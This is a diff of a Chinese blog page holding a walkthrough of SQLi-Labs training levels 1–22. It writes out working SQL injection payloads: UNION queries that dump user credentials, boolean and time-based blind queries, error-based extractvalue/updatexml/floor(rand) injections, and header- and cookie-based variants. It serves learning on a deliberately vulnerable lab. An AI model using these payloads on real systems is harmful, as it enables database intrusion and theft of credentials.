@@ -1,29 +1,20 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 之前总是打了几关就摆了，这次一定打完。
-sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=
-然后确认是数字类型还是字符类型
-?id=1	------	无报错 ?id=1 --&#43;	------	无报错 ?id=1&#39;	------	报错 ?id=1&#39; --&#43;	------	无报错 '>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 之前总是打了几关就摆了，这次一定打完。\nsql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 ">
 <title>Sql Labs靶场 [更新中]</title>
 
 <link rel='canonical' href='https://blog.winglet.com/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/'>
 
-<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='Sql Labs靶场 [更新中]'>
-<meta property='og:description' content='前言 之前总是打了几关就摆了，这次一定打完。
-sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=
-然后确认是数字类型还是字符类型
-?id=1	------	无报错 ?id=1 --&#43;	------	无报错 ?id=1&#39;	------	报错 ?id=1&#39; --&#43;	------	无报错 '>
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="Sql Labs靶场 [更新中]">
+<meta property='og:description' content="前言 之前总是打了几关就摆了，这次一定打完。\nsql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 ">
 <meta property='og:url' content='https://blog.winglet.com/p/sql-labs%E9%9D%B6%E5%9C%BA-%E6%9B%B4%E6%96%B0%E4%B8%AD/'>
 <meta property='og:site_name' content='Winglet&#39;s Blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-04-14T22:48:59&#43;08:00'/><meta property='article:modified_time' content='2024-04-14T22:48:59&#43;08:00'/><meta property='og:image' content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif' />
 <meta name="twitter:title" content="Sql Labs靶场 [更新中]">
-<meta name="twitter:description" content="前言 之前总是打了几关就摆了，这次一定打完。
-sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=
-然后确认是数字类型还是字符类型
-?id=1	------	无报错 ?id=1 --&#43;	------	无报错 ?id=1&#39;	------	报错 ?id=1&#39; --&#43;	------	无报错 "><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="前言 之前总是打了几关就摆了，这次一定打完。\nsql注入基础 less - 1 先找注入点，题上已经给了提示，所以注入点就是?id=\n然后确认是数字类型还是字符类型\n?id=1\t------\t无报错 ?id=1 --+\t------\t无报错 ?id=1&#39;\t------\t报错 ?id=1&#39; --+\t------\t无报错 "><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202406270744823.gif' />
-    <link rel="shortcut icon" href="img/favicon.ico" />
+    <link rel="shortcut icon" href="/img/favicon.ico" />
 
     </head>
     <body class="
@@ -78,7 +69,7 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
             <h1 class="site-name"><a href="/">Winglet&#39;s Blog</a></h1>
             <h2 class="site-description">翩若惊鸿，宛若游龙。</h2>
         </div>
-    </header><ol class="social-menu">
+    </header><ol class="menu-social">
             
                 <li>
                     <a 
@@ -200,31 +191,12 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
             </a>
         </li>
         
+        <li class="menu-bottom-section">
+            <ol class="menu">
 
-        <div class="menu-bottom-section">
-                <li id="i18n-switch">  
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M4 5h7" />
-  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
-  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
-  <path d="M12 20l4 -9l4 9" />
-  <path d="M19.1 18h-6.2" />
-</svg>
-
-
-
-                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
-                        
-                            <option value="https://blog.winglet.com/" selected>中文</option>
-                        
-                    </select>
-                </li>
-            
-            
-            
-                <li id="dark-mode-toggle">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <circle cx="8" cy="12" r="2" />
   <rect x="2" y="6" width="20" height="12" rx="6" />
@@ -232,7 +204,7 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 
 
 
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <circle cx="16" cy="12" r="2" />
   <rect x="2" y="6" width="20" height="12" rx="6" />
@@ -240,10 +212,11 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 
 
 
-                    <span>暗色模式</span>
-                </li>
-            
-        </div>
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
     </ol>
 </aside>
 
@@ -396,11 +369,11 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
     <section class="article-content">
     
     
-    <h2 id="前言">前言</h2>
-<p>之前总是打了几关就摆了，这次一定打完。</p>
-<h2 id="sql注入基础">sql注入基础</h2>
-<h2 id="less---1">less - 1</h2>
-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png"
+    <h2 id="前言">前言
+</h2><p>之前总是打了几关就摆了，这次一定打完。</p>
+<h2 id="sql注入基础">sql注入基础
+</h2><h2 id="less---1">less - 1
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211102977.png"
 	
 	
 	
@@ -474,8 +447,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;--+
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
-</span></span></span></code></pre></div><h2 id="less---2">less - 2</h2>
-<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png"
+</span></span></span></code></pre></div><h2 id="less---2">less - 2
+</h2><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211740465.png"
 	
 	
 	
@@ -504,8 +477,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
-</span></span></span></code></pre></div><h2 id="less---3">less - 3</h2>
-<p>先判断类型</p>
+</span></span></span></code></pre></div><h2 id="less---3">less - 3
+</h2><p>先判断类型</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w">		</span><span class="c1">------		正常
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;		------		报错
 </span></span></span></code></pre></div><p>这里报错显示如下</p>
@@ -527,8 +500,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;--+
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
-</span></span></span></code></pre></div><h2 id="less---4">less - 4</h2>
-<p>还是判断闭合符，这里是通过审计源代码才知道闭合符为<code>&quot;)</code></p>
+</span></span></span></code></pre></div><h2 id="less---4">less - 4
+</h2><p>还是判断闭合符，这里是通过审计源代码才知道闭合符为<code>&quot;)</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34;)		------			报错
 </span></span></span></code></pre></div><p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211831781.png"
 	
@@ -544,8 +517,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
 </span></span></span><span class="line"><span class="cl"><span class="s2">?id=-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="p">,</span><span class="n">id</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="c1">--+
-</span></span></span></code></pre></div><h2 id="less---5">less - 5</h2>
-<p>经过测试可以判断是字符类型且闭合符为<code>'</code>，但是在这关中正常显示的时候只会显示一个页面。</p>
+</span></span></span></code></pre></div><h2 id="less---5">less - 5
+</h2><p>经过测试可以判断是字符类型且闭合符为<code>'</code>，但是在这关中正常显示的时候只会显示一个页面。</p>
 <p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405211835036.png"
 	
 	
@@ -579,14 +552,14 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">50</span><span class="c1">--+
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">逐一检测内容。</span><span class="w">
 </span></span></span></code></pre></div><p>然后可以根据这些sql语句来编写盲注脚本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---6">less - 6</h2>
-<p>闭合符为<code>&quot;</code>，方法同<code>less-5</code></p>
-<h2 id="less---7">less - 7</h2>
-<p>闭合符为<code>'))</code>，方法同<code>less-5</code></p>
-<h2 id="less---8">less - 8</h2>
-<p>闭合符为<code>'</code>，这关除了不会显示报错信息以外，方法同<code>less-5</code></p>
-<h2 id="less---9">less - 9</h2>
-<p>这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用<code>sleep()</code>函数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---6">less - 6
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-5</code></p>
+<h2 id="less---7">less - 7
+</h2><p>闭合符为<code>'))</code>，方法同<code>less-5</code></p>
+<h2 id="less---8">less - 8
+</h2><p>闭合符为<code>'</code>，这关除了不会显示报错信息以外，方法同<code>less-5</code></p>
+<h2 id="less---9">less - 9
+</h2><p>这关无论输入什么页面显示的内容都是一样的，所以布尔盲注就用不了了，但是它依然可以执行我们插入的sql语句。因此在页面不变的时候，我们可以使用时间盲注，就是但判断为真时，让页面过几秒再渲染，这里就需要使用<code>sleep()</code>函数。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(1=1,sleep(5),1)--+
 </span></span></span><span class="line"><span class="cl"><span class="s1">判断参数构造。
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">9</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
@@ -612,10 +585,10 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
 </span></span></span><span class="line"><span class="cl"><span class="s1">逐一检测内容。
 </span></span></span></code></pre></div><p>和布尔盲注一样，需要花费很多时间去一点一点尝试，所以可以构造一个脚本进行测试。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---10">less - 10</h2>
-<p>闭合符为<code>&quot;</code>，方法同<code>less-9</code></p>
-<h2 id="less---11">less - 11</h2>
-<p>这关的页面就和之前的不同了，是一个登录界面。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"></code></pre></div><h2 id="less---10">less - 10
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-9</code></p>
+<h2 id="less---11">less - 11
+</h2><p>这关的页面就和之前的不同了，是一个登录界面。</p>
 <p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405232248969.png"
 	
 	
@@ -651,20 +624,20 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 ></p>
 <p>后面方法同之前一样。</p>
-<h2 id="less---12">less - 12</h2>
-<p>闭合符为<code>&quot;)</code>方法同<code>less-11</code></p>
-<h2 id="less---13">less - 13</h2>
-<p>闭合符为<code>')</code>，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。</p>
+<h2 id="less---12">less - 12
+</h2><p>闭合符为<code>&quot;)</code>方法同<code>less-11</code></p>
+<h2 id="less---13">less - 13
+</h2><p>闭合符为<code>')</code>，但是这关只显示登录成功或失败，所以这关考点是布尔盲注。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;) or length((select database()))&gt;9#
 </span></span></span></code></pre></div><p>这里需要使用<code>or</code>，因为登录账号是错误的，所以需要由后面的判断来决定这段语句的<code>true or false</code></p>
-<h2 id="less---14">less - 14</h2>
-<p>闭合符为<code>&quot;</code>，方法同<code>less-13</code></p>
-<h2 id="less---15">less - 15</h2>
-<p>闭合符为<code>'</code>，方法同<code>less-13</code></p>
-<h2 id="less---16">less - 16</h2>
-<p>闭合符为<code>&quot;)</code>，方法同<code>less-13</code></p>
-<h2 id="less---17">less - 17</h2>
-<p>这关又有新的东西了，先看部分源代码</p>
+<h2 id="less---14">less - 14
+</h2><p>闭合符为<code>&quot;</code>，方法同<code>less-13</code></p>
+<h2 id="less---15">less - 15
+</h2><p>闭合符为<code>'</code>，方法同<code>less-13</code></p>
+<h2 id="less---16">less - 16
+</h2><p>闭合符为<code>&quot;)</code>，方法同<code>less-13</code></p>
+<h2 id="less---17">less - 17
+</h2><p>这关又有新的东西了，先看部分源代码</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_input</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>           <span class="c1">// $value是 username 中的内容
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
@@ -702,8 +675,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 ></p>
 <p>这里需要用到的就是报错注入。报错注入一般使用这三个函数<code>extractvalue()</code>、<code>updatexml()</code>、<code>group by()</code>。</p>
-<h3 id="extractvalue">extractvalue</h3>
-<p><code>extractvalue(XML_document, Path_string)</code></p>
+<h3 id="extractvalue">extractvalue
+</h3><p><code>extractvalue(XML_document, Path_string)</code></p>
 <p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
 <p>第二个参数：XPath_string（XPath格式的字符串）</p>
 <p>原理：extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。</p>
@@ -727,8 +700,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 	
 ></p>
-<h3 id="updatexml">updatexml</h3>
-<p><code>updatexml(XML_document, XPath_string, new_value)</code></p>
+<h3 id="updatexml">updatexml
+</h3><p><code>updatexml(XML_document, XPath_string, new_value)</code></p>
 <p>第一个参数：XML_document是String格式，为XML文档对象的名称。</p>
 <p>第二个参数：XPath_string(XPath格式的字符串)</p>
 <p>第三个参数：new_value, String格式，替换查找到的符合条件的数据</p>
@@ -754,8 +727,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 	
 ></p>
-<h3 id="group-by">group by</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">123</span><span class="s1">&#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+<h3 id="group-by">group by
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">123</span><span class="s1">&#39; and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
 </span></span></span><span class="line"><span class="cl"><span class="s1">123&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span><span class="o">#</span><span class="w">      </span><span class="err">爆数据库版本</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="s1">&#39; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
 </span></span></span><span class="line"><span class="cl"><span class="s1">1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span><span class="o">#</span><span class="w">        </span><span class="err">爆出所有表</span><span class="w">
@@ -772,8 +745,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 	
 ></p>
-<h2 id="less---18">less - 18</h2>
-<p>这关也使用报错注入，但是注入点不同，查看源代码</p>
+<h2 id="less---18">less - 18
+</h2><p>这关也使用报错注入，但是注入点不同，查看源代码</p>
 <p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251512795.png"
 	
 	
@@ -797,12 +770,12 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 ></p>
 <p>之后就可以使用<code>less-17</code>报错注入的方法了</p>
-<h2 id="less---19">less - 19</h2>
-<p>这里的注入点变成了<code>referer</code>请求头，写法如下</p>
+<h2 id="less---19">less - 19
+</h2><p>这里的注入点变成了<code>referer</code>请求头，写法如下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">referer</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39;,2)#
 </span></span></span></code></pre></div><p>方法同<code>less-18</code></p>
-<h2 id="less---20">less - 20</h2>
-<p>这关注入点在<code>cookie</code>字段</p>
+<h2 id="less---20">less - 20
+</h2><p>这关注入点在<code>cookie</code>字段</p>
 <p>这里需要先正常登录，然后进入登录界面</p>
 <p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251536259.png"
 	
@@ -826,8 +799,8 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 ></p>
 <p>方法同<code>less-17</code></p>
-<h2 id="less---21">less - 21</h2>
-<p>源代码中</p>
+<h2 id="less---21">less - 21
+</h2><p>源代码中</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=(&#39;</span><span class="si">$cookee</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span></code></pre></div><p>所以这里闭合符为<code>')</code>,注入点依然是<code>cookie</code>字段，不同点在于这关注入语句需要进行<code>base64编码</code></p>
 <p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251548942.png"
@@ -840,10 +813,10 @@ sql注入基础 less - 1 先找注入点，题上已经给了提示，所以注�
 	
 	
 ></p>
-<h2 id="less---22">less - 22</h2>
-<p>闭合符为<code>&quot;</code>，方法同<code>less-21</code></p>
-<h2 id="less---23">less - 23</h2>
